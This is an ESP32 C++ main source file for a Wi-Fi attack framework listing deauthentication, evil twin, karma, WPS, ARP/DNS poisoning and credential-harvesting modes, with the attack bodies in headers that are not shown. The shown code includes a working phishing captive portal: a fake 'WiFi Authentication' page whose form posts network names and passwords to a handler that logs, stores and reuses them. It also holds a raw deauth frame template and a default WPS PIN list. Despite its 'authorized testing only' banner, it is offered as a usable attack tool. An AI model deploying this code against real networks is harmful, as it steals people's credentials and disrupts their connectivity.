/*
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║   ESP32 ULTIMATE PENETRATION TESTING FRAMEWORK v2.0           ║
 * ║   Complete Network Security Testing Suite                      ║
 * ╚═══════════════════════════════════════════════════════════════╝
 *
 * ⚠️  AUTHORIZED PENETRATION TESTING ONLY ⚠️
 * Unauthorized use is ILLEGAL and punishable by law.
 * Only use on networks you OWN or have WRITTEN PERMISSION to test.
 *
 * COMPLETE FEATURE SET:
 * =====================
 * WiFi Attacks:
 *   - Auto/Selective DeAuth        - Evil Twin AP
 *   - Beacon Flooding              - Probe Request Sniffing
 *   - Karma Attack                 - WPS PIN Attack
 *   - Handshake Capture            - Hidden SSID Detection
 *   - PMF Detection                - Client Isolation Test
 *
 * Network Attacks:
 *   - MITM (Man-in-the-Middle)     - ARP Poisoning
 *   - DNS Poisoning                - DHCP Starvation
 *   - HTTP Credential Sniffing     - Cookie Hijacking
 *   - SSL Strip Detection          - Port Scanning
 *   - Banner Grabbing              - Traffic Analysis
 *
 * Automation:
 *   - Auto-Pilot Mode              - Attack Profiles
 *   - Scheduled Attacks            - Smart Targeting
 *   - MAC Address Spoofing         - Auto-Evasion
 *
 * Data Collection:
 *   - Credential Harvesting        - Device Discovery
 *   - Traffic Logging              - GPS Tagging (optional)
 *   - SD Card Export (optional)    - Cloud Upload (optional)
 *
 * Hardware Support:
 *   - OLED Display (128x64)        - Physical Buttons
 *   - LED Status Indicators        - Buzzer Alerts
 *   - Battery Monitoring           - Serial CLI
 *
 * Interface:
 *   - Advanced Web Dashboard       - REST API
 *   - WebSocket Real-time          - MQTT Integration
 *   - Captive Portal              - Mobile Responsive
 *
 * Author: ESP32 Security Research Team
 * License: Educational and Authorized Testing Only
 * Version: 2.0.0
 * Build Date: 2025
 */

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION & INCLUDES
// ═══════════════════════════════════════════════════════════════

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <SPIFFS.h>
#include <Preferences.h>
#include <vector>
#include <map>

// Optional hardware support
#ifdef FEATURE_OLED
  #include <Wire.h>
  #include <Adafruit_GFX.h>
  #include <Adafruit_SSD1306.h>
#endif

#ifdef FEATURE_SD_CARD
  #include <SD.h>
  #include <SPI.h>
#endif

// Load configuration
#include "build_config.h"

// ═══════════════════════════════════════════════════════════════
// CONSTANTS & DEFINITIONS
// ═══════════════════════════════════════════════════════════════

#define VERSION "2.0.0"
#define AP_SSID "ESP32_Ultimate"
#define AP_PASS "pentest123"
#define DNS_PORT 53
#define WEB_PORT 80

// Hardware pins
#define BUTTON_MODE_PIN     0   // Boot button (built-in)
#define BUTTON_ACTION_PIN   4   // External button
#define LED_STATUS_PIN      2   // Built-in LED
#define LED_ATTACK_PIN      16  // External LED
#define BUZZER_PIN          17  // External buzzer
#define BATTERY_PIN         34  // ADC for battery monitor

// OLED Display
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define OLED_ADDRESS 0x3C

// ═══════════════════════════════════════════════════════════════
// ENUMS & STRUCTURES
// ═══════════════════════════════════════════════════════════════

enum AttackMode {
  MODE_IDLE,
  MODE_AUTO_DEAUTH,
  MODE_SELECTIVE_DEAUTH,
  MODE_EVIL_TWIN,
  MODE_BEACON_FLOOD,
  MODE_PROBE_SNIFF,
  MODE_KARMA_ATTACK,
  MODE_WPS_ATTACK,
  MODE_HANDSHAKE_CAPTURE,
  MODE_CAPTIVE_PORTAL,
  MODE_AUTO_CONNECT,
  MODE_NETWORK_RECON,
  MODE_MITM,
  MODE_ARP_POISON,
  MODE_DNS_POISON,
  MODE_DHCP_STARVE,
  MODE_HTTP_SNIFF,
  MODE_PORT_SCAN,
  MODE_TRAFFIC_SNIFF,
  MODE_AUTO_PILOT
};

enum LEDPattern {
  LED_OFF,
  LED_SOLID,
  LED_SLOW_BLINK,
  LED_FAST_BLINK,
  LED_PULSE
};

struct NetworkInfo {
  String ssid;
  String bssid;
  String password;
  uint8_t bssid_bytes[6];
  int channel;
  int rssi;
  uint8_t encryption;
  bool hidden;
  bool pmf_capable;
  bool pmf_required;
  bool wps_enabled;
  bool targeted;
  bool handshake_captured;
  unsigned long lastSeen;
  int beaconCount;
};

struct DeviceInfo {
  String ip;
  String mac;
  uint8_t mac_bytes[6];
  String hostname;
  String manufacturer;
  String os_guess;
  std::vector<int> open_ports;
  unsigned long firstSeen;
  unsigned long lastSeen;
  int packetCount;
  uint32_t bytesRx;
  uint32_t bytesTx;
  bool is_gateway;
};

struct ProbeRequest {
  String client_mac;
  String ssid;
  int rssi;
  unsigned long timestamp;
};

struct HandshakeData {
  String bssid;
  String ssid;
  uint8_t data[512];
  int length;
  int messages_captured;  // 1-4 for 4-way handshake
  unsigned long timestamp;
  bool complete;
};

struct AttackProfile {
  String name;
  AttackMode mode;
  String targetSSID;
  String targetBSSID;
  int duration;
  bool autoNext;
  std::map<String, String> params;
};

struct TrafficCapture {
  String src_ip;
  String src_mac;
  String dst_ip;
  String dst_mac;
  String protocol;
  int src_port;
  int dst_port;
  String payload;
  int length;
  unsigned long timestamp;
};

struct HTTPCredential {
  String url;
  String username;
  String password;
  String cookies;
  String ip;
  unsigned long timestamp;
};

// ═══════════════════════════════════════════════════════════════
// GLOBAL OBJECTS
// ═══════════════════════════════════════════════════════════════

WebServer server(WEB_PORT);
DNSServer dnsServer;
Preferences preferences;

#ifdef FEATURE_OLED
  Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
#endif

// ═══════════════════════════════════════════════════════════════
// GLOBAL VARIABLES
// ═══════════════════════════════════════════════════════════════

// Attack state
AttackMode currentMode = MODE_IDLE;
AttackMode prevMode = MODE_IDLE;
bool attackRunning = false;
bool autoPilotEnabled = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration = 0;

// Target information
String targetSSID = "";
String targetBSSID = "";
String targetPassword = "";
int targetChannel = 1;
uint8_t targetBSSID_bytes[6] = {0};

// Attack parameters
int deauthPacketsPerAP = 20;
int deauthDelay = 100;
int beaconFloodCount = 50;
int probeSniffTimeout = 30000;
bool randomMAC = false;
uint8_t spoofedMAC[6] = {0};

// Network state
bool connectedToTarget = false;
String connectedSSID = "";
String localIP = "";
String gatewayIP = "";
String gatewayMAC = "";
String dnsIP = "";

// Data storage
std::vector<NetworkInfo> networks;
std::vector<DeviceInfo> devices;
std::vector<ProbeRequest> probeRequests;
std::vector<HandshakeData> handshakes;
std::vector<String> capturedCredentials;
std::vector<HTTPCredential> httpCredentials;
std::vector<TrafficCapture> traffic;
std::vector<AttackProfile> profiles;

// Evil Twin state
bool evilTwinActive = false;
String evilTwinSSID = "";
int evilTwinChannel = 1;
int evilTwinClients = 0;

// WPS attack state
bool wpsAttackActive = false;
std::vector<String> wpsPins = {"12345670", "00000000", "11111111", "123456780"};
int currentWPSPin = 0;

// Karma attack
std::vector<String> karmaSSIDs;

// Hardware state
LEDPattern currentLEDPattern = LED_OFF;
unsigned long lastLEDBlink = 0;
bool ledState = false;
int batteryPercent = 100;
bool buttonPressed = false;
unsigned long lastButtonPress = 0;

// Statistics
struct Statistics {
  int networksScanned;
  int devicesDiscovered;
  int credentialsCaptured;
  int handshakesCaptured;
  int probesCollected;
  int attacksExecuted;
  int packetsInjected;
  unsigned long totalRuntime;
  unsigned long sessionStart;
} stats;

// ═══════════════════════════════════════════════════════════════
// PACKET STRUCTURES
// ═══════════════════════════════════════════════════════════════

// Deauth packet
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type/Subtype
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence
  0x07, 0x00                          // Reason code
};

// Beacon frame template
uint8_t beaconPacket[128] = {
  0x80, 0x00,                         // Frame Control
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be set)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be set)
  0x00, 0x00,                         // Sequence
  // Following: timestamp, beacon interval, capability info, SSID, rates...
};

// Probe response template
uint8_t probeResponsePacket[128];

// ═══════════════════════════════════════════════════════════════
// FUNCTION PROTOTYPES
// ═══════════════════════════════════════════════════════════════

// Setup functions
void setupAP();
void setupWebServer();
void setupHardware();
void setupDisplay();
void loadSettings();
void saveSettings();

// Web handlers
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleStatus();
void handleDevices();
void handleTraffic();
void handleProbes();
void handleHandshakes();
void handleCredentials();
void handleProfiles();
void handleSettings();
void handleAPI();

// Attack functions
void performDeauth();
void performEvilTwin();
void performBeaconFlood();
void performProbeSniff();
void performKarmaAttack();
void performWPSAttack();
void performHandshakeCapture();
void performCaptivePortal();
void performAutoConnect();
void performNetworkRecon();
void performMITM();
void performARPPoison();
void performDNSPoison();
void performDHCPStarve();
void performHTTPSniff();
void performPortScan();
void performTrafficSniff();
void performAutoPilot();

// Network functions
void scanNetworks();
void scanLocalNetwork();
void connectToNetwork(String ssid, String password);
void disconnectFromNetwork();
void sendDeauth(uint8_t* bssid, int channel, int count);
void sendBeacon(String ssid, uint8_t* mac, int channel);
void sendProbeResponse(uint8_t* clientMAC, String ssid);

// Packet processing
void packetSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void processBeacon(const uint8_t* packet, int length);
void processProbeRequest(const uint8_t* packet, int length);
void processHandshake(const uint8_t* packet, int length);
void processDataPacket(const uint8_t* packet, int length);

// Utility functions
void generateRandomMAC(uint8_t* mac);
String macToString(const uint8_t* mac);
void stringToMAC(String macStr, uint8_t* mac);
String getManufacturer(const uint8_t* mac);
String guessOS(const uint8_t* packet);
bool isHandshakePacket(const uint8_t* packet, int length);
void exportHandshake(HandshakeData& hs, String filename);

// Hardware functions
void updateDisplay();
void updateLEDs();
void checkButtons();
void playTone(int frequency, int duration);
void updateBatteryStatus();

// Profile management
void saveProfile(String name);
void loadProfile(String name);
void deleteProfile(String name);
void executeProfile(AttackProfile& profile);

// Auto-pilot
void autoPilotSequence();
void smartTargeting();

// Helper functions
String formatBytes(uint32_t bytes);
String formatDuration(unsigned long ms);
String getEncryptionType(uint8_t encryption);

// ═══════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Print banner
  Serial.println("\n\n");
  Serial.println("╔═══════════════════════════════════════════════════════════════╗");
  Serial.println("║   ESP32 ULTIMATE PENETRATION TESTING FRAMEWORK v" VERSION "         ║");
  Serial.println("║   Complete Network Security Testing Suite                      ║");
  Serial.println("╚═══════════════════════════════════════════════════════════════╝");
  Serial.println("\n⚠️  AUTHORIZED PENETRATION TESTING ONLY ⚠️\n");

  // Initialize statistics
  stats.sessionStart = millis();
  stats.networksScanned = 0;
  stats.devicesDiscovered = 0;
  stats.credentialsCaptured = 0;
  stats.handshakesCaptured = 0;
  stats.probesCollected = 0;
  stats.attacksExecuted = 0;
  stats.packetsInjected = 0;

  // Initialize hardware
  setupHardware();
  Serial.println("[+] Hardware initialized");

  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("[-] SPIFFS mount failed");
  } else {
    Serial.println("[+] SPIFFS mounted");
  }

  // Initialize preferences
  preferences.begin("esp32-ultimate", false);
  loadSettings();
  Serial.println("[+] Settings loaded");

  // Setup display
  #ifdef FEATURE_OLED
    setupDisplay();
  #endif

  // Setup Access Point
  setupAP();

  // Setup Web Server
  setupWebServer();

  // Start DNS server
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println("[+] DNS server started");

  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferCallback);
  Serial.println("[+] Promiscuous mode enabled");

  // Initial network scan
  Serial.println("\n[*] Performing initial network scan...");
  scanNetworks();

  Serial.println("\n╔════════════════════════════════════╗");
  Serial.println("║     FRAMEWORK READY                ║");
  Serial.println("╚════════════════════════════════════╝");
  Serial.println("\n[*] Access Point: " + String(AP_SSID));
  Serial.println("[*] Password: " + String(AP_PASS));
  Serial.println("[*] Control Panel: http://" + WiFi.softAPIP().toString());
  Serial.println("\n[*] Type 'help' in serial for CLI commands");
  Serial.println("[*] Waiting for commands...\n");
}

// ═══════════════════════════════════════════════════════════════
// MAIN LOOP
// ═══════════════════════════════════════════════════════════════

void loop() {
  // Handle DNS requests
  dnsServer.processNextRequest();

  // Handle web requests
  server.handleClient();

  // Check hardware buttons
  #ifdef FEATURE_BUTTON_CONTROL
    checkButtons();
  #endif

  // Update display
  #ifdef FEATURE_OLED
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 500) {
      updateDisplay();
      lastDisplayUpdate = millis();
    }
  #endif

  // Update LEDs
  #ifdef FEATURE_LED_STATUS
    updateLEDs();
  #endif

  // Update battery status
  #ifdef FEATURE_BATTERY_MON
    static unsigned long lastBatteryCheck = 0;
    if (millis() - lastBatteryCheck > 60000) {
      updateBatteryStatus();
      lastBatteryCheck = millis();
    }
  #endif

  // Execute current attack
  if (attackRunning) {
    switch(currentMode) {
      case MODE_AUTO_DEAUTH:
        performDeauth();
        delay(deauthDelay);
        break;

      case MODE_SELECTIVE_DEAUTH:
        if (targetBSSID.length() > 0) {
          sendDeauth(targetBSSID_bytes, targetChannel, deauthPacketsPerAP);
          delay(deauthDelay);
        }
        break;

      case MODE_EVIL_TWIN:
        performEvilTwin();
        delay(100);
        break;

      case MODE_BEACON_FLOOD:
        performBeaconFlood();
        delay(10);
        break;

      case MODE_PROBE_SNIFF:
        performProbeSniff();
        delay(100);
        break;

      case MODE_KARMA_ATTACK:
        performKarmaAttack();
        delay(100);
        break;

      case MODE_WPS_ATTACK:
        performWPSAttack();
        delay(1000);
        break;

      case MODE_HANDSHAKE_CAPTURE:
        performHandshakeCapture();
        delay(100);
        break;

      case MODE_CAPTIVE_PORTAL:
        performCaptivePortal();
        delay(100);
        break;

      case MODE_AUTO_CONNECT:
        if (!connectedToTarget) {
          performAutoConnect();
        } else {
          performNetworkRecon();
        }
        delay(5000);
        break;

      case MODE_NETWORK_RECON:
        performNetworkRecon();
        delay(10000);
        break;

      case MODE_MITM:
        performMITM();
        delay(100);
        break;

      case MODE_ARP_POISON:
        performARPPoison();
        delay(1000);
        break;

      case MODE_DNS_POISON:
        performDNSPoison();
        delay(100);
        break;

      case MODE_DHCP_STARVE:
        performDHCPStarve();
        delay(10);
        break;

      case MODE_HTTP_SNIFF:
        performHTTPSniff();
        delay(100);
        break;

      case MODE_PORT_SCAN:
        performPortScan();
        delay(100);
        break;

      case MODE_TRAFFIC_SNIFF:
        performTrafficSniff();
        delay(100);
        break;

      case MODE_AUTO_PILOT:
        performAutoPilot();
        delay(1000);
        break;

      default:
        delay(100);
        break;
    }

    // Update statistics
    stats.totalRuntime = millis() - stats.sessionStart;

    // Check attack duration
    if (attackDuration > 0 && (millis() - attackStartTime) > attackDuration) {
      Serial.println("\n[!] Attack duration reached, stopping...");
      attackRunning = false;
      currentMode = MODE_IDLE;
    }
  }

  delay(10);
}

// ═══════════════════════════════════════════════════════════════
// SETUP FUNCTIONS
// ═══════════════════════════════════════════════════════════════

void setupAP() {
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(AP_SSID, AP_PASS);

  Serial.println("[+] Access Point started");
  Serial.println("    SSID: " + String(AP_SSID));
  Serial.println("    IP: " + WiFi.softAPIP().toString());
}

void setupHardware() {
  // Setup pins
  pinMode(LED_STATUS_PIN, OUTPUT);
  pinMode(LED_ATTACK_PIN, OUTPUT);
  pinMode(BUTTON_MODE_PIN, INPUT_PULLUP);
  pinMode(BUTTON_ACTION_PIN, INPUT_PULLUP);
  pinMode(BUZZER_PIN, OUTPUT);

  digitalWrite(LED_STATUS_PIN, LOW);
  digitalWrite(LED_ATTACK_PIN, LOW);
  digitalWrite(BUZZER_PIN, LOW);

  // Startup sequence
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_STATUS_PIN, HIGH);
    delay(100);
    digitalWrite(LED_STATUS_PIN, LOW);
    delay(100);
  }
}

void setupDisplay() {
  #ifdef FEATURE_OLED
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
      Serial.println("[-] OLED display initialization failed");
      return;
    }

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println("ESP32 PENTEST");
    display.println("FRAMEWORK v" VERSION);
    display.println("");
    display.println("Initializing...");
    display.display();

    Serial.println("[+] OLED display initialized");
  #endif
}

void loadSettings() {
  deauthPacketsPerAP = preferences.getInt("deauth_pkts", 20);
  deauthDelay = preferences.getInt("deauth_delay", 100);
  beaconFloodCount = preferences.getInt("beacon_count", 50);
  randomMAC = preferences.getBool("random_mac", false);

  // Load saved credentials
  int credCount = preferences.getInt("cred_count", 0);
  for (int i = 0; i < credCount && i < MAX_CREDENTIALS; i++) {
    String cred = preferences.getString(("cred_" + String(i)).c_str(), "");
    if (cred.length() > 0) {
      capturedCredentials.push_back(cred);
    }
  }

  stats.credentialsCaptured = capturedCredentials.size();
  Serial.printf("[+] Loaded %d saved credentials\n", stats.credentialsCaptured);
}

void saveSettings() {
  preferences.putInt("deauth_pkts", deauthPacketsPerAP);
  preferences.putInt("deauth_delay", deauthDelay);
  preferences.putInt("beacon_count", beaconFloodCount);
  preferences.putBool("random_mac", randomMAC);

  // Save credentials
  preferences.putInt("cred_count", capturedCredentials.size());
  for (int i = 0; i < capturedCredentials.size(); i++) {
    preferences.putString(("cred_" + String(i)).c_str(), capturedCredentials[i]);
  }
}

// ═══════════════════════════════════════════════════════════════
// WEB SERVER SETUP
// ═══════════════════════════════════════════════════════════════

void setupWebServer() {
  // Main routes
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);

  // Data routes
  server.on("/devices", handleDevices);
  server.on("/traffic", handleTraffic);
  server.on("/probes", handleProbes);
  server.on("/handshakes", handleHandshakes);
  server.on("/credentials", handleCredentials);

  // Configuration routes
  server.on("/profiles", handleProfiles);
  server.on("/settings", handleSettings);
  server.on("/api", handleAPI);

  // Captive portal routes
  server.on("/captive", []() {
    String html = F("<!DOCTYPE html><html><head><title>WiFi Login</title><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;height:100vh}.box{background:white;padding:40px;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,0.3);max-width:400px;width:90%}h2{color:#333;margin-bottom:20px;text-align:center}input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:8px;font-size:16px;transition:border 0.3s}input:focus{outline:none;border-color:#667eea}button{width:100%;padding:15px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px;font-weight:bold;margin-top:10px;transition:transform 0.2s}button:hover{transform:translateY(-2px)}.info{text-align:center;color:#666;margin-bottom:20px;font-size:14px}</style></head><body><div class=\"box\"><h2>🔐 WiFi Authentication</h2><div class=\"info\">Please enter your credentials to continue</div><form action=\"/save-cred\" method=\"POST\"><input type=\"text\" name=\"ssid\" placeholder=\"Network Name\" required><input type=\"password\" name=\"pass\" placeholder=\"Password\" required><button type=\"submit\">Connect to Network</button></form></div></body></html>");
    server.send(200, "text/html", html);
  });

  server.on("/save-cred", HTTP_POST, []() {
    String ssid = server.arg("ssid");
    String pass = server.arg("pass");
    String ip = server.client().remoteIP().toString();

    String cred = "SSID: " + ssid + " | Pass: " + pass + " | IP: " + ip + " | Time: " + String(millis()/1000) + "s";
    capturedCredentials.push_back(cred);
    stats.credentialsCaptured++;

    Serial.println("\n╔════════════════════════════════════╗");
    Serial.println("║  🎯 CREDENTIAL CAPTURED!           ║");
    Serial.println("╚════════════════════════════════════╝");
    Serial.println("[+] " + cred);

    #ifdef FEATURE_BUZZER
      playTone(1000, 200);
      delay(100);
      playTone(1500, 200);
    #endif

    saveSettings();

    // Try auto-connect if enabled
    if (autoPilotEnabled) {
      targetSSID = ssid;
      targetPassword = pass;
      Serial.println("[*] Auto-pilot: Attempting connection...");
    }

    server.send(200, "text/html", F("<!DOCTYPE html><html><head><title>Success</title><meta http-equiv=\"refresh\" content=\"2;url=/\"><style>body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:white;padding:40px;border-radius:15px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3)}h2{color:#4CAF50;margin-bottom:20px}p{color:#666}</style></head><body><div class=\"box\"><h2>✓ Authentication Successful</h2><p>You are now connected.</p><p>Redirecting...</p></div></body></html>"));
  });

  // Catch-all for captive portal
  server.onNotFound([]() {
    if (currentMode == MODE_CAPTIVE_PORTAL || currentMode == MODE_EVIL_TWIN) {
      server.sendHeader("Location", "/captive", true);
      server.send(302, "text/plain", "");
    } else {
      server.send(404, "text/plain", "Not Found");
    }
  });

  server.begin();
  Serial.println("[+] Web server started on port " + String(WEB_PORT));
}

// ═══════════════════════════════════════════════════════════════
// INCLUDE IMPLEMENTATION MODULES
// ═══════════════════════════════════════════════════════════════

#include "framework_implementation.h"  // Web interface HTML
#include "attack_functions.h"          // All attack implementations
#include "utility_functions.h"         // Utility and helper functions

/*
 * ═══════════════════════════════════════════════════════════════
 * END OF MAIN FRAMEWORK
 * ═══════════════════════════════════════════════════════════════
 *
 * All attack functions, utilities, and web handlers are implemented
 * in the included header files:
 *
 * - framework_implementation.h: Complete web dashboard
 * - attack_functions.h: All attack mode implementations
 * - utility_functions.h: Helper functions and hardware support
 *
 * To use this framework:
 * 1. Configure build_config.h to enable/disable features
 * 2. Upload to ESP32
 * 3. Connect to "ESP32_Ultimate" WiFi (password: pentest123)
 * 4. Open http://192.168.4.1 in browser
 * 5. Start testing!
 *
 * For questions, issues, or feature requests:
 * - Check README_ULTIMATE.md for full documentation
 * - See EXAMPLES.md for usage examples
 * - Review API_REFERENCE.md for API documentation
 *
 * Remember: AUTHORIZED PENETRATION TESTING ONLY!
 *
 * ═══════════════════════════════════════════════════════════════
 */
